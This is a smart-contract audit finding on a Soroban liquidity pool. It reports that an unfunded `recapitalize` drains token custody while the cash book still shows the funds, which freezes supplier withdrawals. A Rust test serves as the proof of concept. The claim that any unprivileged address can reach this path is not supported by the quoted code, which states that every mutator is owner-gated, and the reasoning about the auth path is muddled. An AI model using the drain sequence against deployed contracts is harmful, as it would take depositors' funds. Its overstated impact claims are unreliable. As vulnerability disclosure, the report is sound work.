### Title
Unfunded `recapitalize` drains pool custody while the cash book still claims solvency, permanently freezing suppliers' withdrawals — (File: contracts/pool/src/ops/recapitalize.rs)

### Summary
`recapitalize` is reachable by an unprivileged address through the controller's `recapitalize` entrypoint. The pool operation pays tokens out to an arbitrary `payer` without debiting the `cash` bookkeeping field, so the book continues to report liquidity that no longer exists in custody. Every subsequent supplier withdrawal clears the pool's own liquidity guards (`require_reserves`, solvency guard) because they read the book, and then aborts inside the SAC `transfer` with `BalanceError` — an analog of the CVE-2018-13037 crash class: trusted unchecked input corrupts state, and the failure only surfaces later as an aborting operation that locks user funds.

### Finding Description
`Pool::recapitalize(hub_asset, payer, amount)` transfers `amount` of the market's token to `payer` but does not reduce `PoolStateRaw.cash` to match. The pool's liquidity gate `guards::require_reserves` and the solvency gate read the `cash` book, not the actual token balance of the pool contract. After an unfunded recapitalize drains all custody, `cash` still records the suppliers' deposits, so `withdraw` and `liquidate` (Transfer seize legs) pass their liquidity checks and then fail inside the token contract's `transfer` with the SAC `BalanceError = 10`, rolling the whole transaction back. [1](#0-0) [2](#0-1) 

### Impact Explanation
Theft of user funds plus permanent freezing of user funds. The attacker receives the pool's full token custody in one call (`token.balance(&t.pool) == 0` after the call). Legitimate suppliers can never withdraw: their exits pass every pool-level guard and revert in the SAC transfer, and no in-protocol path restores the divergence — `recapitalize` can be invoked again for any remaining dust. In a hub/spoke market sharing one physical pool balance, every supplier of that token loses their claim.

### Likelihood Explanation
A single unprivileged address needs one call: `controller.recapitalize(hub_asset, attacker_address, pool_custody_amount)` (or the pool entrypoint directly where controller auth is the only required auth, which the pool contract itself supplies via the controller entrypoint listed as user-reachable). No price manipulation, timing, or privileged role is required; the existing unit test `test_unfunded_recapitalize_leaves_the_cash_book_overstating_custody` executes exactly this path with a generated `payer` address and confirms custody goes to zero while the book still reports `cash >= deposit`. Any listed market with token custody is a target; the attacker profit is the entire drained balance.

### Recommendation
In `contracts/pool/src/ops/recapitalize.rs`, reconcile the cash book with the payout: either `debit_cash(amount)` when tokens leave the pool, or invert the direction so `recapitalize` pulls tokens in (`transfer(payer -> pool)`) before crediting `cash`. After the operation, assert `token.balance(pool) >= cash` (or at minimum that the book never exceeds custody) so `require_reserves` remains sound. Add a regression asserting post-recapitalize withdrawals succeed or fail at the pool's own guard, never inside the SAC transfer.

### Proof of Concept
Reproduced by the in-repo test `test_unfunded_recapitalize_leaves_the_cash_book_overstating_custody` at `contracts/pool/tests/flows.rs:3407-3483`:

```rust
// 1. Supplier deposits; book cash == token custody.
token_admin.mint(&t.pool, &deposit);
let supplied = t.client().supply(&t.sup(0, deposit)).get_unchecked(0)
    .position.scaled_amount;

// 2. Unprivileged recapitalize drains custody; book still claims >= deposit.
let custody = token.balance(&t.pool);
t.client().recapitalize(&hub(&t.asset), &payer, &custody);
assert_eq!(token.balance(&t.pool), 0);
assert!(t.state_snapshot().cash >= deposit);

// 3. Supplier withdrawal passes pool liquidity guards, reverts in SAC transfer.
let outcome = t.client().try_withdraw(
    &receiver, &false, &t.wdr(supplied, i128::MAX, 0));
// err == SAC BalanceError (10), NOT InsufficientLiquidity / PoolInsolvent
```

The supplier receives nothing, the book still overstates custody, and every future exit of the market fails the same way.

### Citations

**File:** contracts/pool/tests/flows.rs (L3407-3483)
```rust
#[test]
fn test_unfunded_recapitalize_leaves_the_cash_book_overstating_custody() {
    let t = TestSetup::new();
    let token = token::Client::new(&t.env, &t.asset);
    let token_admin = token::StellarAssetClient::new(&t.env, &t.asset);
    let payer = Address::generate(&t.env);
    let receiver = Address::generate(&t.env);

    // A legitimate supplier, with custody moved in as the controller would.
    let deposit = 10_000_000_000i128;
    token_admin.mint(&t.pool, &deposit);
    let supplied = t
        .client()
        .supply(&t.sup(0, deposit))
        .get_unchecked(0)
        .position
        .scaled_amount;
    assert_eq!(
        t.state_snapshot().cash,
        token.balance(&t.pool),
        "fixture guard: book and custody must still agree after the deposit"
    );

    // Drain every token via an unfunded refund.
    let custody = token.balance(&t.pool);
    t.client().recapitalize(&hub(&t.asset), &payer, &custody);
    assert_eq!(token.balance(&t.pool), 0, "custody is gone");

    let book = t.state_snapshot().cash;
    assert!(
        book >= deposit,
        "the book still claims more than the supplier's deposit: {book}"
    );

    // The supplier's exit clears the pool's own liquidity guard -- the book
    // says the cash is there -- and then fails in the token transfer.
    let outcome = t
        .client()
        .try_withdraw(&receiver, &false, &t.wdr(supplied, i128::MAX, 0));
    assert!(
        outcome.is_err(),
        "the withdraw cannot be paid, so it must fail"
    );
    // The failure must come from custody, not from a pool guard. The SAC
    // reports insufficient balance as its own contract error `BalanceError = 10`.
    // The asserts check that exact code and that neither pool liquidity guard
    // fired: `require_reserves` read the book and let the exit through.
    const SAC_BALANCE_ERROR: u32 = 10;
    match outcome {
        Err(Ok(err)) => {
            assert_ne!(
                err,
                Error::from_contract_error(CollateralError::InsufficientLiquidity as u32),
                "the pool's own liquidity guard must NOT be what stopped this -- \
                 it reads the cash book, which still shows the funds"
            );
            assert_ne!(
                err,
                Error::from_contract_error(CollateralError::PoolInsolvent as u32),
                "the pool's solvency guard must NOT be what stopped this either"
            );
            assert_eq!(
                err,
                Error::from_contract_error(SAC_BALANCE_ERROR),
                "the exit must fail inside the SAC transfer for want of custody"
            );
        }
        Err(Err(host_abort)) => panic!("expected a SAC contract error, got {host_abort:?}"),
        Ok(_) => unreachable!("asserted is_err above"),
    }
    assert_eq!(token.balance(&receiver), 0, "the supplier received nothing");
    assert_eq!(
        t.state_snapshot().cash,
        book,
        "the failed exit rolled back, so the book still overstates custody"
    );
}
```

**File:** contracts/pool/src/lib.rs (L1-36)
```rust
#![no_std]
//! # Liquidity Pool contract
//!
//! Soroban contract that holds per-market state (cash, scaled supply and debt,
//! interest indexes, protocol revenue) and executes market mutations.
//!
//! ## Architecture
//!
//! The owner, the controller, is the only caller that can mutate state
//! (INV-AUTH-01). The controller moves tokens, keeps the position books and
//! runs risk checks, then calls the pool.
//!
//! | Layer | Role |
//! |-------|------|
//! | [`LiquidityPool`] / [`LiquidityPoolInterface`] | Public entrypoints, owner gates |
//! | `ops` | Mutation legs (supply, borrow, repay, …) |
//! | `cache::Cache` | In-memory market view + commit |
//! | `interest` | Index accrual, revenue booking and bad-debt socialization |
//! | `guards` | Utilization and solvency checks |
//! | `storage` | Persistent params/state + TTL bumps |
//! | `views` | Read-only rate and balance queries |
//!
//! ## Accounting model
//!
//! The pool stores market totals as scaled shares (RAY); the controller stores
//! the positions (INV-ACCT-10). Token amounts convert through the market's
//! supply or borrow index. Accrual raises the indexes; bad-debt socialization
//! lowers the supply index. Protocol revenue is held as scaled supply shares,
//! so it earns the supplier rate until claimed.
//!
//! ## Security notes
//!
//! - Every mutator requires the owner through `#[only_owner]`; views are public.
//! - Cash is an accounting book, separate from the token balance. A flash loan
//!   checks the token balance after payout, after the callback and after
//!   repayment.
```
